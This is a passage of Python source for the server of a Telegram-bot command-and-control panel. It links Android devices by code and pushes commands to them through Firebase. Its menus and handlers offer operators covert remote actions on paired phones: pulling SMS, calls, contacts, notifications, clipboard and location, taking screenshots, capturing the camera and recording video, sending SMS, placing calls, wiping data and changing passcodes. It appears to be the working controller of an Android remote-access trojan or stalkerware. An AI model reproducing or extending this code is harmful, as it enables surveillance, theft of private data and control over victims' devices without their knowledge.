        log.error("Firebase GET %s failed: %s", path, exc)
    return None


async def firebase_set(path, data):
    """SET data in Firebase RTDB - with optional Database Secret auth."""
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        session = get_tg_session()
        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            ok = resp.status in (200, 204)
            if ok:
                log.debug("Firebase SET %s OK", path)
            else:
                body = await resp.text()
                log.warning("Firebase SET %s failed: status=%d body=%s", path, resp.status, body[:200])
            return ok
    except Exception as exc:
        log.error("Firebase SET %s failed: %s", path, exc)
        return False


async def firebase_update(path, data):
    """PATCH (partial update) data in Firebase RTDB - with optional Database Secret auth."""
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if FIREBASE_DB_SECRET:
            url += f"?auth={FIREBASE_DB_SECRET}"
        session = get_tg_session()
        async with session.patch(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            ok = resp.status in (200, 204)
            if ok:
                log.debug("Firebase UPDATE %s OK", path)
            else:
                body = await resp.text()
                log.warning("Firebase UPDATE %s failed: status=%d body=%s", path, resp.status, body[:200])
            return ok
    except Exception as exc:
        log.error("Firebase UPDATE %s failed: %s", path, exc)
        return False


def firebase_push_command(cmd):
    """Push command to Firebase so the Android app can receive it."""
    import asyncio
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(_firebase_push_cmd_async(cmd))
        else:
            loop.run_until_complete(_firebase_push_cmd_async(cmd))
    except RuntimeError:
        asyncio.run(_firebase_push_cmd_async(cmd))


async def _firebase_push_cmd_async(cmd):
    """Async: Push command to Firebase /commands/{device_id}/{cmd_id}"""
    device_id = cmd.get("device_id", "")
    cmd_id = cmd.get("id", "")
    if not device_id or not cmd_id:
        return
    try:
        ok = await firebase_set(f"commands/{device_id}/{cmd_id}", {
            "id": cmd["id"],
            "device_id": cmd["device_id"],
            "command": cmd["command"],
            "params": cmd.get("params", {}),
            "status": "pending",
            "created_at": cmd["created_at"],
            "server_domain": SERVER_DOMAIN,
            "server_port": SERVER_PORT,
        })
        if ok:
            log.info("Firebase: Command %s pushed for device %s", cmd_id, device_id)
        else:
            log.warning("Firebase: Failed to push command %s", cmd_id)
    except Exception as exc:
        log.error("Firebase push command error: %s", exc)


async def generate_link_code():
    """Generate a lifetime link code - saved to Firebase + local backup.
    كود مدى الحياة - لربط جهاز واحد فقط - متزامن مع Firebase."""
    code = secrets.token_urlsafe(6).upper()[:8]
    now = datetime.now(timezone.utc)
    entry = {
        "code": code,
        "created_at": now.isoformat(),
        "used": False,
        "device_id": None,
        "session_id": secrets.token_urlsafe(16),
    }
    # 1. حفظ محلياً (ك.backup)
    codes = load_json(LINK_CODES_FILE, [])
    codes.append(entry)
    if len(codes) > 500:
        codes = codes[-200:]
    save_json(LINK_CODES_FILE, codes)
    append_event("Link code generated", {"code": code})
    # 2. حفظ في Firebase (انتظار التأكيد)
    fb_ok = await firebase_set(f"link_codes/{code}", entry)
    if fb_ok:
        log.info("تم حفظ كود الربط %s في Firebase", code)
    else:
        log.warning("لم يتم حفظ كود الربط %s في Firebase - محفوظ محلياً فقط", code)
    return entry


async def verify_link_code(code):
    """Verify link code - checks Firebase first, then local fallback."""
    # 1. التحقق من Firebase
    fb_data = await firebase_get(f"link_codes/{code}")
    if fb_data is not None:
        if fb_data.get("used"):
            return {"ok": False, "error": "Code already used"}
        return {"ok": True, "code_entry": fb_data}
    # 2. التحقق من الملف المحلي
    codes = load_json(LINK_CODES_FILE, [])
    for entry in codes:
        if entry.get("code") == code:
            if entry.get("used"):
                return {"ok": False, "error": "Code already used"}
            return {"ok": True, "code_entry": entry}
    return {"ok": False, "error": "Invalid code"}


async def consume_link_code(code, device_id):
    """Mark link code as used in Firebase + local."""
    now = datetime.now(timezone.utc).isoformat()
    # 1. تحديث Firebase
    await firebase_update(f"link_codes/{code}", {
        "used": True,
        "device_id": device_id,
        "used_at": now,
    })
    # 2. تحديث محلي
    codes = load_json(LINK_CODES_FILE, [])
    for entry in codes:
        if entry.get("code") == code:
            entry["used"] = True
            entry["device_id"] = device_id
            entry["used_at"] = now
            save_json(LINK_CODES_FILE, codes)
            return True
    return False

# ============================================================================
# TELEGRAM API HELPERS (aiohttp only)
# ============================================================================

def get_tg_session():
    global _tg_session
    if _tg_session is None or _tg_session.closed:
        _tg_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
    return _tg_session


async def tg_request(method, payload=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        session = get_tg_session()
        async with session.post(url, json=payload or {}) as resp:
            data = await resp.json()
            if not data.get("ok"):
                log.warning("TG %s error: %s", method, data.get("description", ""))
            return data
    except Exception as exc:
        log.error("TG %s failed: %s", method, exc)
        return None


async def send_message(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
    global messages_sent
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if disable_notification:
        payload["disable_notification"] = True
    result = await tg_request("sendMessage", payload)
    if result and result.get("ok"):
        messages_sent += 1
    return result


async def send_admin(text, parse_mode="HTML", reply_markup=None):
    return await send_message(ADMIN_CHAT_ID, text, parse_mode, reply_markup)


async def send_photo(chat_id, file_data, caption=None):
    session = get_tg_session()
    try:
        data = aiohttp.FormData()
        data.add_field("chat_id", str(chat_id))
        data.add_field("photo", file_data, filename="data.jpg")
        if caption:
            data.add_field("caption", caption)
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data) as resp:
            return await resp.json()
    except Exception as exc:
        log.error("send_photo failed: %s", exc)
        return None


async def answer_callback_query(callback_query_id, text="", show_alert=False):
    return await tg_request("answerCallbackQuery", {
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


async def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return await tg_request("editMessageText", payload)

# ============================================================================
# INLINE KEYBOARD BUILDERS
# ============================================================================

def ib(text, callback_data):
    return {"text": text, "callback_data": callback_data}


def build_main_menu():
    return {
        "inline_keyboard": [
            [ib("📱 الأجهزة والربط", "menu_devices")],
            [ib("📊 جمع البيانات", "menu_data")],
            [ib("🌐 التواصل الاجتماعي", "menu_social")],
            [ib("🎮 التحكم عن بعد", "menu_control")],
            [ib("📦 إدارة التطبيقات", "menu_apps")],
            [ib("📂 إدارة الملفات", "menu_files")],
            [ib("🔒 الأمان والإدارة", "menu_security")],
            [ib("🔍 المراقبة", "menu_monitor")],
            [ib("⚙️ إعدادات النظام", "menu_syssettings")],
            [ib("🖥️ إدارة السيرفر", "menu_server")],
            [ib("⁉️ المساعدة", "menu_help")],
        ]
    }


def build_back_button(target="back_main"):
    return {"inline_keyboard": [[ib("🔙 رجوع", target)]]}


def build_devices_menu():
    devices = get_devices()
    rows = []
    for d in devices:
        status = "🟢" if d.get("active") else "🔴"
        name = d.get("name", d.get("id", "مجهول"))
        rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
    if not devices:
        rows.append([ib("لا توجد أجهزة مربوطة", "no_action")])
    rows.append([ib("🔗 ربط جهاز جديد", "do_link")])
    rows.append([ib("🔙 رجوع", "back_main")])
    return {"inline_keyboard": rows}


def build_device_menu(device_id):
    return {
        "inline_keyboard": [
            [ib("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
            [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
            [ib("📲 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
            [ib("📇 جهات الاتصال", f"cmd_contacts_{device_id}"), ib("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
            [ib("📸 لقطة الشاشة", f"cmd_screenshot_{device_id}"), ib("📷 الكاميرا", f"submenu_camera_{device_id}")],
            [ib("📋 الحافظة", f"cmd_clipboard_{device_id}"), ib("📱 التطبيقات", f"cmd_apps_{device_id}")],
            [ib("🌐 التواصل", f"submenu_social_{device_id}")],
            [ib("🎮 التحكم", f"submenu_control_{device_id}")],
            [ib("📂 الملفات", f"submenu_files_{device_id}")],
            [ib("🔒 الأمان", f"submenu_security_{device_id}")],
            [ib("🔍 المراقبة", f"submenu_monitor_{device_id}")],
            [ib("⚙️ الإعدادات", f"submenu_syssettings_{device_id}")],
            [ib("🗑️ إلغاء الربط", f"do_unlink_{device_id}")],
            [ib("🔙 رجوع", "menu_devices")],
        ]
    }


def build_category_submenu(device_id, category):
    """Build submenu for a command category with 2-column grid."""
    items = []
    for name, info in COMMAND_REGISTRY.items():
        if info["cat"] == category:
            items.append((name, info))
    
    if not items:
        return build_back_button(f"dev_{device_id}")
    
    rows = []
    # Display in 2-column grid for cleaner layout
    for i in range(0, len(items), 2):
        row = [ib(items[i][1]["desc"], f"exec_{items[i][0]}_{device_id}")]
        if i + 1 < len(items):
            row.append(ib(items[i+1][1]["desc"], f"exec_{items[i+1][0]}_{device_id}"))
        rows.append(row)
    
    rows.append([ib("🔙 رجوع", f"dev_{device_id}")])
    return {"inline_keyboard": rows}


def build_data_submenu(device_id):
    return build_category_submenu(device_id, "data")


def build_social_submenu(device_id):
    return build_category_submenu(device_id, "social")


def build_control_submenu(device_id):
    return build_category_submenu(device_id, "control")


def build_apps_submenu(device_id):
    return build_category_submenu(device_id, "apps")


def build_files_submenu(device_id):
    return build_category_submenu(device_id, "files")


def build_security_submenu(device_id):
    return build_category_submenu(device_id, "security")


def build_monitor_submenu(device_id):
    return build_category_submenu(device_id, "monitor")


def build_syssettings_submenu(device_id):
    return build_category_submenu(device_id, "syssettings")


def build_server_menu():
    return {
        "inline_keyboard": [
            [ib("📊 حالة السيرفر", "srv_status")],
            [ib("📈 الإحصائيات", "srv_stats")],
            [ib("📝 سجل الأحداث", "srv_logs")],
            [ib("⚙️ الإعدادات", "srv_settings")],
            [ib("🔑 تغيير كلمة المرور", "srv_setpass")],
            [ib("➕ إضافة أدمن", "srv_addadmin")],
            [ib("📢 إرسال عام", "srv_broadcast")],
            [ib("💾 نسخ احتياطي", "srv_backup")],
            [ib("📤 تصدير", "srv_export")],
            [ib("📥 استيراد", "srv_import")],
            [ib("🗑️ مسح البيانات", "srv_cleardata")],
            [ib("🔄 إعادة تشغيل", "srv_restart")],
            [ib("🔧 الصيانة", "srv_maintenance")],
            [ib("🔙 رجوع", "back_main")],
        ]
    }


def build_help_menu():
    total = len(COMMAND_REGISTRY)
    cats = OrderedDict()
    for name, info in COMMAND_REGISTRY.items():
        cat = info["cat"]
        if cat not in cats:
            cats[cat] = []
        cats[cat].append(info)
    
    text = f"📖 <b>دليل الأوامر - أبو الزهراء</b>\n\nالإجمالي: <b>{total}</b> أوامر\n\n"
    cat_names = {
        "data": "📊 جمع البيانات", "social": "🌐 التواصل الاجتماعي",
        "control": "🎮 التحكم عن بعد", "apps": "📦 إدارة التطبيقات",
        "files": "📂 إدارة الملفات", "security": "🔒 الأمان",
        "monitor": "🔍 المراقبة", "syssettings": "⚙️ إعدادات النظام",
    }
    for cat, items in cats.items():
        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
        for item in items[:3]:
            text += f"  /{item['cmd'].replace('get_','').replace('cmd_','')}\n"
        if len(items) > 3:
            text += f"  ...+{len(items)-3} more\n"
        text += "\n"
    
    text += "📱 /devices - قائمة الأجهزة\n🔗 /link - ربط جهاز\n"
    text += "📋 /menu - القائمة الرئيسية\n📊 /status - الحالة\n"
    return text

# ============================================================================
# COMMAND EXECUTOR
# ============================================================================

async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_id=None):
    """Queue a command for a device and notify admin."""
    if not device_id or device_id == "none":
        await send_message(chat_id, "❌ لم يتم اختيار جهاز. استخدم /link أولاً.", reply_markup=build_main_menu())
        return
    
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود.", reply_markup=build_main_menu())
        return
    
    cmd = queue_command(device_id, cmd_name, params)
    reg = COMMAND_REGISTRY.get(cmd_name, {})
    desc = reg.get("desc", cmd_name)
    emoji = reg.get("emoji", "📋")
    
    text = (
        f"{emoji} <b>تم إرسال الأمر</b>\n\n"
        f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
        f"📋 الأمر: <code>{cmd_name}</code>\n"
        f"🆔 المعرف: <code>{cmd['id']}</code>\n\n"
        f"⏳ بانتظار استجابة الجهاز..."
    )
    
    kb = build_device_menu(device_id)
    
    if msg_id:
        await edit_message_text(chat_id, msg_id, text, reply_markup=kb)
    else:
        await send_message(chat_id, text, reply_markup=kb)

# ============================================================================
# TELEGRAM COMMAND HANDLER
# ============================================================================

async def handle_telegram_command(chat_id, text, message_id=None):
    parts = text.strip().split(maxsplit=3)
    cmd = parts[0].lower()
    args = parts[1:] if len(parts) > 1 else []
    arg1 = args[0] if args else ""
    arg2 = args[1] if len(args) > 1 else ""

    # === منع إرسال رسائل مكررة (Rate Limiting) ===
    now = time.time()
    last_time = _last_message_time.get(chat_id, 0)
    if now - last_time < RATE_LIMIT_SECONDS:
        log.warning("Rate limited: %s from %s", cmd, chat_id)
        return
    _last_message_time[chat_id] = now

    # Resolve device_id
    dev_id = arg1
    if not dev_id or not find_device(dev_id):
        d = get_first_device()
        dev_id = d["id"] if d else ""

    log.info("CMD %s from %s: %s", cmd, chat_id, args)
    append_event("Telegram command", {"command": cmd, "args": args})

    # ── Utility Commands ──
    if cmd == "/start":
        await handle_start(chat_id)
    elif cmd == "/help":
        text = build_help_menu()
        await send_message(chat_id, text, reply_markup=build_back_button())
    elif cmd == "/menu":
        await send_message(chat_id, "📋 <b>القائمة الرئيسية</b>\nاختر تصنيفاً:", reply_markup=build_main_menu())
    elif cmd == "/status":
        await handle_status(chat_id)
    elif cmd == "/about":
        await send_message(chat_id, (
            "🟥 <b>سيرفر أبو الزهراء v3.0</b>\n\n"
            "نظام إدارة الأجهزة المتكامل\n"
            f"النطاق: <code>{SERVER_DOMAIN}</code>\n"
            f"المنفذ: <code>{SERVER_PORT}</code>\n"
            f"الأوامر: <code>{len(COMMAND_REGISTRY)}</code>\n"
            f"وقت التشغيل: <code>{format_uptime(get_uptime())}</code>"
        ), reply_markup=build_back_button())
    elif cmd == "/version":
        await send_message(chat_id, "🟥 <b>أبو الزهراء v3.0</b>\nالإصدار: 2025.01\nالأوامر: 200+\nالمحرك: aiohttp", reply_markup=build_back_button())
    elif cmd == "/test":
        await send_message(chat_id, "✅ السيرفر يعمل!\n🟢 جميع الأنظمة تعمل.", reply_markup=build_back_button())

    # ── Device Management ──
    elif cmd == "/devices":
        await handle_devices(chat_id)
    elif cmd == "/link":
        await handle_link(chat_id)
    elif cmd == "/unlink":
        await handle_unlink(chat_id, arg1)
    elif cmd == "/device":
        await handle_device_detail(chat_id, arg1)
    elif cmd == "/device_rename":
        if arg1 and arg2:
            if update_device(arg1, {"name": arg2}):
                await send_message(chat_id, f"✅ تم إعادة تسمية الجهاز إلى <code>{arg2}</code>", reply_markup=build_back_button())
            else:
                await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
        else:
            await send_message(chat_id, "الاستخدام: /device_rename معرف_الجهاز الاسم_الجديد", reply_markup=build_back_button())
    elif cmd == "/device_wipe":
        await execute_device_command(chat_id, dev_id, "wipe_data")
    elif cmd == "/device_locate":
        await execute_device_command(chat_id, dev_id, "get_location")
    elif cmd == "/device_lock":
        await execute_device_command(chat_id, dev_id, "lock_phone")
    elif cmd == "/device_ring":
        await execute_device_command(chat_id, dev_id, "ring")
    elif cmd == "/device_settings":
        d = find_device(dev_id)
        if d:
            await send_message(chat_id, f"⚙️ الإعدادات لجهاز <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
        else:
            await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())

    # ── Server Management ──
    elif cmd == "/server_status":
        await handle_status(chat_id)
    elif cmd == "/server_restart":
        await send_admin("🔄 تم طلب إعادة تشغيل السيرفر...")
        append_event("Server restart requested")
    elif cmd == "/clear_data":
        save_json(COMMANDS_FILE, [])
        save_json(EVENTS_FILE, [])
        await send_admin("✅ تم مسح قائمة الأوامر والأحداث", reply_markup=build_back_button())
    elif cmd == "/backup":
        await send_admin("💾 جارٍ إنشاء نسخة احتياطية...", reply_markup=build_back_button())
        append_event("Backup created")
    elif cmd == "/export":
        await send_admin("📤 بدأ التصدير", reply_markup=build_back_button())
    elif cmd == "/import":
        await send_admin("📥 جاهز للاستيراد", reply_markup=build_back_button())
    elif cmd == "/stats":
        devices = get_devices()
        online = sum(1 for d in devices if d.get("active"))
        cmds = load_json(COMMANDS_FILE, [])
        pending = sum(1 for c in cmds if c.get("status") == "pending")
        done = sum(1 for c in cmds if c.get("status") == "completed")
        text = (
            "📈 <b>الإحصائيات</b>\n\n"
            f"📱 الأجهزة: {len(devices)} (🟢 {online})\n"
            f"📋 إجمالي الأوامر: {len(cmds)}\n"
            f"⏳ معلّق: {pending}\n"
            f"✅ مكتمل: {done}\n"
            f"📨 الرسائل المرسلة: {messages_sent}\n"
            f"📡 طلبات API: {api_hits}\n"
            f"⏱️ وقت التشغيل: {format_uptime(get_uptime())}"
        )
        await send_message(chat_id, text, reply_markup=build_back_button())
    elif cmd == "/logs":
        events = load_json(EVENTS_FILE, [])[-20:]
        text = "📝 <b>السجلات الأخيرة</b>\n\n"
        for e in events:
            text += f"[{e.get('time','')}] {e.get('event','')}\n"
        await send_message(chat_id, text[:4000], reply_markup=build_back_button())
    elif cmd == "/clear_logs":
        save_json(EVENTS_FILE, [])
        await send_admin("✅ تم مسح السجلات", reply_markup=build_back_button())
    elif cmd == "/settings":
        s = load_settings()
        await send_message(chat_id, f"⚙️ <b>الإعدادات</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
    elif cmd == "/set_password":
        if arg1:
            s = load_settings()
            s["admin_password"] = arg1
            save_settings_data(s)
            await send_admin("✅ تم تغيير كلمة المرور", reply_markup=build_back_button())
        else:
            await send_admin("الاستخدام: /set_password كلمة_المرور_الجديدة", reply_markup=build_back_button())
    elif cmd == "/add_admin":
        await send_admin("استخدم /set_password لتغيير كلمة مرور الأدمن", reply_markup=build_back_button())
    elif cmd == "/remove_admin":
        await send_admin("الميزة غير متاحة في وضع الأدمن الواحد", reply_markup=build_back_button())
    elif cmd == "/broadcast":
        await send_admin("لا يوجد مستخدمون آخرون للإرسال", reply_markup=build_back_button())
    elif cmd == "/maintenance":
        s = load_settings()
        s["maintenance"] = not s.get("maintenance", False)
        save_settings_data(s)
        state = "مفعّل 🔧" if s["maintenance"] else "معطّل ✅"
        await send_admin(f"🔧 وضع الصيانة: {state}", reply_markup=build_back_button())
    elif cmd == "/export_data":
        await send_admin("📤 تم تصدير البيانات", reply_markup=build_back_button())
    elif cmd == "/import_data":
        await send_admin("📥 جاهز لاستيراد البيانات", reply_markup=build_back_button())
    elif cmd == "/update_bot":
        await send_admin("🟥 البوت محدّث (v3.0)", reply_markup=build_back_button())

    # ── 200+ Device Commands from Registry ──
    elif cmd[1:] in COMMAND_REGISTRY:
        reg = COMMAND_REGISTRY[cmd[1:]]
        cmd_key = cmd[1:]
        if cmd_key in ("set_volume", "set_brightness", "set_ringtone", "set_wallpaper",
                        "open_app", "close_app", "install_app", "uninstall_app",
                        "block_app", "unblock_app", "clear_app_data", "force_stop_app",
                        "app_info", "enable_app", "disable_app", "update_app",
                        "launch_app", "kill_app", "list_files", "get_file",
                        "download_file", "delete_file", "rename_file", "copy_file",
                        "move_file", "create_folder", "search_files", "zip_files",
                        "change_passcode", "set_pin", "speak_text", "show_notification",
                        "open_url", "send_sms", "make_call", "block_number",
                        "unblock_number", "set_language", "set_timezone", "set_alarm",
                        "set_timer", "set_reminder", "dns_change", "proxy_set",
                        "apn_settings", "play_sound", "geo_add", "geo_remove"):
            params = {"arg": arg2} if arg2 else {"arg": arg1}
            await execute_device_command(chat_id, dev_id, reg["cmd"], params)
        else:
            await execute_device_command(chat_id, dev_id, reg["cmd"])
    else:
        await send_message(chat_id, f"❓ أمر غير معروف: <code>{cmd}</code>\nاستخدم /help لعرض قائمة الأوامر.", reply_markup=build_back_button())


async def handle_start(chat_id):
    text = (
        "🟥 <b>سيرفر التحكم أبو الزهراء</b>\n\n"
        "مرحباً بك في لوحة التحكم\n"
        "تحكم بجميع الأجهزة المربوطة عن بعد\n\n"
        f"🟢 وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
        f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
        f"🌐 النطاق: <code>{SERVER_DOMAIN}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_main_menu())


async def handle_status(chat_id):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    cmds = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in cmds if c.get("status") == "pending")
    events = load_json(EVENTS_FILE, [])
    text = (
        "📊 <b>حالة السيرفر</b>\n\n"
        f"🟢 الحالة: <code>يعمل</code>\n"
        f"⏱️ وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
        f"🕐 الوقت: <code>{ts()}</code>\n\n"
        f"📱 الأجهزة: <code>{len(devices)}</code> (🟢 {online} متصل)\n"
        f"📨 الرسائل: <code>{messages_sent}</code>\n"
        f"📡 طلبات API: <code>{api_hits}</code>\n"
        f"📋 معلّق: <code>{pending}</code>\n"
        f"📝 الأحداث: <code>{len(events)}</code>\n"
        f"📋 إجمالي الأوامر: <code>{len(COMMAND_REGISTRY)}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_back_button())


async def handle_devices(chat_id):
    devices = get_devices()
    if not devices:
        await send_message(chat_id, "📱 لا توجد أجهزة مربوطة\nاستخدم /link لإضافة جهاز", reply_markup=build_back_button())
        return
    text = "📱 <b>قائمة الأجهزة</b>\n\n"
    for d in devices:
        status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
        name = d.get("name", d.get("model", "مجهول"))
        text += f"{'─'*20}\n📱 <b>{name}</b>\n   المعرف: <code>{d['id']}</code>\n   الحالة: {status}\n   آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
    await send_message(chat_id, text, reply_markup=build_devices_menu())


async def handle_link(chat_id):
    global _last_link_code_time
    # === منع إنشاء أكواد مكررة - كود واحد فقط ===
    now = time.time()
    if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
        await send_message(chat_id, "⏱️ انتظر قليلاً قبل طلب كود جديد...", reply_markup=build_back_button())
        return
    _last_link_code_time = now

    entry = await generate_link_code()
    text = (
        "🔗 <b>ربط جهاز جديد</b>\n\n"
        f"🔑 الكود: <code>{entry['code']}</code>\n\n"
        "أدخل هذا الكود في تطبيق الأندرويد\n"
        "🔒 صالح مدى الحياة لربط جهاز واحد فقط\n\n"
        "سيتم إشعارك عند نجاح الربط"
    )
    await send_message(chat_id, text, reply_markup=build_back_button())


async def handle_unlink(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "الاستخدام: /unlink معرف_الجهاز", reply_markup=build_back_button())
        return
    if remove_device(device_id):
        await send_message(chat_id, f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
    else:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())


async def handle_device_detail(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "الاستخدام: /device معرف_الجهاز", reply_markup=build_back_button())
        return
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
        return
    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
    text = (
        f"📱 <b>تفاصيل الجهاز</b>\n\n"
        f"{'─'*20}\n"
        f"📱 الاسم: <code>{d.get('name','—')}</code>\n"
        f"🆔 المعرف: <code>{d['id']}</code>\n"
        f"📊 الحالة: {status}\n"
        f"📱 الموديل: <code>{d.get('model','—')}</code>\n"
        f"🤖 النظام: <code>{d.get('os','—')}</code>\n"
        f"🔋 البطارية: <code>{d.get('battery','—')}%</code>\n"
        f"📶 الشبكة: <code>{d.get('network','—')}</code>\n"
        f"📍 الموقع: <code>{d.get('location','—')}</code>\n"
        f"🕐 آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
        f"📅 تاريخ التسجيل: <code>{d.get('created_at','—')}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))

# ============================================================================
# CALLBACK QUERY HANDLER
# ============================================================================

async def handle_callback_query(callback):
    cb_id = callback.get("id", "")
    data = callback.get("data", "")
    msg = callback.get("message", {})
    chat_id = msg.get("chat", {}).get("id", ADMIN_CHAT_ID)
    message_id = msg.get("message_id")

    log.info("Callback: %s from %s", data, chat_id)

    try:
        # ── Navigation ──
        if data == "back_main":
            await edit_message_text(chat_id, message_id, "📋 <b>القائمة الرئيسية</b>\nاختر:", reply_markup=build_main_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_devices":
            await edit_message_text(chat_id, message_id, "📱 <b>الأجهزة</b>", reply_markup=build_devices_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_help":
            text = build_help_menu()
            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button())
            await answer_callback_query(cb_id)
            return

        if data == "menu_server":
            await edit_message_text(chat_id, message_id, "🖥️ <b>إدارة السيرفر</b>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return

        if data == "no_action":
            await answer_callback_query(cb_id, "لا يوجد إجراء")
            return

        # ── Link ──
        if data == "do_link":
            global _last_link_code_time
            now = time.time()
            if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
                await answer_callback_query(cb_id, "انتظر قليلاً...")
                return
            _last_link_code_time = now

            entry = await generate_link_code()
            text = (
                "🔗 <b>ربط جهاز جديد</b>\n\n"
                f"🔑 الكود: <code>{entry['code']}</code>\n\n"
                "أدخل هذا الكود في تطبيق الأندرويد\n"
                "🔒 صالح مدى الحياة لربط جهاز واحد"
            )
            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button("menu_devices"))
            await answer_callback_query(cb_id)
            return

        # ── Unlink ──
        if data.startswith("do_unlink_"):
            device_id = data.replace("do_unlink_", "")
            if remove_device(device_id):
                text = f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>"
                await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
            else:
                await answer_callback_query(cb_id, "فشل العملية", show_alert=True)
            await answer_callback_query(cb_id)
            return

        # ── Device Selected ──
        if data.startswith("dev_"):
            device_id = data[4:]
            d = find_device(device_id)
            if d:
                status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nاختر إجراء:"
                await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
            else:
                await answer_callback_query(cb_id, "الجهاز غير موجود", show_alert=True)
            return

        # ── Category Submenus ──
        submenu_map = {
            "submenu_data": build_data_submenu,
            "submenu_social": build_social_submenu,
            "submenu_control": build_control_submenu,
            "submenu_apps": build_apps_submenu,
            "submenu_files": build_files_submenu,
            "submenu_security": build_security_submenu,
            "submenu_monitor": build_monitor_submenu,
            "submenu_syssettings": build_syssettings_submenu,
        }
        for prefix, builder in submenu_map.items():
            if data.startswith(prefix + "_"):
                device_id = data[len(prefix)+1:]
                if prefix == "submenu_data":
                    kb = build_data_submenu(device_id)
                elif prefix == "submenu_social":
                    kb = build_social_submenu(device_id)
                elif prefix == "submenu_control":
                    kb = build_control_submenu(device_id)
                elif prefix == "submenu_apps":
                    kb = build_apps_submenu(device_id)
                elif prefix == "submenu_files":
                    kb = build_files_submenu(device_id)
                elif prefix == "submenu_security":
                    kb = build_security_submenu(device_id)
                elif prefix == "submenu_monitor":
                    kb = build_monitor_submenu(device_id)
                elif prefix == "submenu_syssettings":
                    kb = build_syssettings_submenu(device_id)
                else:
                    kb = build_back_button()
                cat_label = prefix.replace("submenu_", "").title()
                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} - الأوامر</b>\nاختر أمراً:", reply_markup=kb)
                await answer_callback_query(cb_id)
                return

        # ── Camera submenu ──
        if data.startswith("submenu_camera_"):
            device_id = data[len("submenu_camera_"):]
            kb = {
                "inline_keyboard": [
                    [ib("📷 كاميرا أمامية", f"exec_front_camera_{device_id}")],
                    [ib("📷 كاميرا خلفية", f"exec_back_camera_{device_id}")],
                    [ib("🎬 تسجيل فيديو", f"exec_record_video_{device_id}")],
                    [ib("🔙 رجوع", f"dev_{device_id}")],
                ]
            }
            await edit_message_text(chat_id, message_id, "📷 <b>الكاميرا</b>", reply_markup=kb)
            await answer_callback_query(cb_id)
            return

        # ── Execute command from inline button ──
        if data.startswith("exec_"):
            remainder = data[5:]  # Remove "exec_"
            # Find device_id by checking known devices (handles multi-underscore commands)
            matched = False
            for d in get_devices():
                did = d["id"]
                if remainder.endswith(f"_{did}"):
                    cmd_name = remainder[:-len(f"_{did}")]
                    reg = COMMAND_REGISTRY.get(cmd_name)
                    if reg:
                        await execute_device_command(chat_id, did, reg["cmd"], msg_id=message_id)
                        await answer_callback_query(cb_id, f"تم إرسال الأمر: {reg['desc']}")
